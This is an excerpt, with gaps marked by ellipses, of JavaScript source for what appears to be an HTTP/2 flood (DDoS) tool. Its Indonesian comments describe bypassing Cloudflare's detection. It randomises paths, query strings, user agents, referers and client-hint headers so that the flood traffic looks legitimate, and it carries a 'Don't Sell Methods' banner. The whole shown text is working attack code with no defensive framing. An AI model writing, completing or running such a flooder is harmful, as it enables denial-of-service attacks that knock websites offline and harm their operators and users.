...
var randomReferer = refers[Math.floor(Math.floor(Math.random() * refers.length))];
var secChMobile = sec_ch_ua_mobile[Math.floor(Math.floor(Math.random() * sec_ch_ua_mobile.length))];
...
if (cluster.isMaster) {
   ...
   console.log(`--------------------------------------------`.gray)
   console.log(`Note: Don't Sell Methods`.brightCyan)
...
function shuffleObject(obj) {
 ...
 return shuffledObject;
				...
				// ========== BYPASS SIGNATURE 3 CLOUDFLARE ==========
				// Path dibuat lebih normal & dinamis
				const cleanPath = parsedTarget.pathname || "/";
				const normalPath = cleanPath.endsWith('/') ? cleanPath + generateRandomString(3,10) : cleanPath + "/" + generateRandomString(3,10);
				// Query string sederhana, gak berlebihan
				const queryString = "?" + generateRandomString(4,8) + "=" + generateRandomString(3,6) + "&" + generateRandomString(4,8) + "=" + generateRandomString(3,6);
				const finalPath = normalPath + queryString;
				// ===================================================
				
				const shuffledHeaders = shuffleObject({
				...headers,
				":path": finalPath, // Path normal & gak mencurigakan
				"cache-control": "max-age=0",
				"user-agent": uap[Math.floor(Math.random() * uap.length)], // UAP fresh dari list
				"accept": accept_header[Math.floor(Math.random() * accept_header.length)],
				"referer": randomReferer,
				"accept-language": lang,
				"sec-ch-ua": uaa[Math.floor(Math.random() * uaa.length)],
				"sec-ch-ua-platform": pua[Math.floor(Math.random() * pua.length)],
				"sec-ch-ua-mobile": "?0",
				"sec-fetch-site": "same-origin",
				"sec-fetch-mode": "cors",
				"sec-fetch-dest": "empty",
			    ...
			    ...reflectionsHeaders[Math.floor(Math.random()*reflectionsHeaders.length)],
				});
           ...
           }, Math.floor(Math.random() * 1500) + 300); // Delay random tiap loop
           //});
        });
